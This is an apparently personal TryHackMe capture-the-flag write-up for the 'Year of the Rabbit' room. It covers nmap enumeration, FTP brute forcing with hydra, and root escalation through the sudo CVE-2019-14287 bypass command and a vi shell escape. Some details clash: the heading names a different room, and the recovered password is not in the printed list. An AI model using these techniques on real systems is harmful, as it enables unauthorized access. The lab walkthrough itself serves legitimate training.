---
title: year-of-the-rabbit
date: 2023-02-27 20:15 +0800
categories: [THM writeup]
tags: [flags,hacking,tryhackme]
---


## Lian Yu
<https://tryhackme.com/room/yearoftherabbit>


### Objective:
  Capture the two flags.
 
### Difficulty:
  Hard
  
### #Enumeration
we will start with nmap as per usual way for starting enumeration.

```bash
nmap -A 10.10.226.122 -r
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 18:03 IST
Nmap scan report for 10.10.226.122
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a08b6b7809390332ea524c203e82ad60 (DSA)
|   2048 df25d0471f37d918818738763092651f (RSA)
|   256 be9f4f014a44c8adf503cb00ac8f4944 (ECDSA)
|_  256 dbb1c1b9cd8c9d604ff198e299fe0803 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.56 seconds
```
{: .nolineno}

check the inspect element of the first landing page and i encountered a abnormality.

there is a linked style sheet which is abnormal because most of the time first landing page has inline style sheet, so check the style sheet and found there is a hidden page given in comment section of page.

```html
/* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
  ```

visit the page and there was _turn off the javascript_ alert. so turn off the javascript and reload the page.

it takes to a video page. there is nothing important there.

checked the video, it is normal video of song with a voice message telling i am on wrong track but there is a burp in between may be it is a clue for burp suite.

i started the burp suite and loaded the page again.

the page is getting redirected to another page on a hidden directory which can be seen in request in burp.

> GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1

checked that directory there is a pic _Hot_babe.png_. may be steganography is used i tried steghide and binwalk but no luck.

so i tried strings and saw there is a ftp username with random list of passwords.

```bash
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
```

i copied passwords to a file and used hydra against ftp server with username ans password list and found the password for the user name.

> [21][ftp] host: 10.10.17.42   login: ftpuser   password: 5iez1wGXKfPKQ

logged in to ftp server and found a file named _eli's_creds.txt_.

it is brainfuck code which can be decoded easily using help of internet.It will get you eli's username and password.

login using eli's username and password to ssh.
on login there is a banner showing a message for gwendoline.

to find the location of secret file we located the s3cr3t folder.

 >locate s3cr3t

 that file  is message for gwendoline from root to change his password to a good not a ---------.

 so we got the gwendoline's password.

login to gwendoline's account and there is your first flag
> user.txt flag

to check the priviledge escalation we checked the sudo permissions for gwendoline

```
sudo -l
```

in the result we found there is a command which gwendoline can execute without password but not as root.

after some research i found out that sudo have a vulnerability  of CVE-2019-14287 which can be exploited to access root.

```bash
sudo -u#-1 /usr/bin/vi ~/gwendoline/user.txt
```
{: .nolineno}

it will open the file in vi editor as root. now execute following command in vi to access full root shell
```
:!sh
```
it will give you the full shell access as a root and there is a root flag in /root/root.txt.


## happy hacking
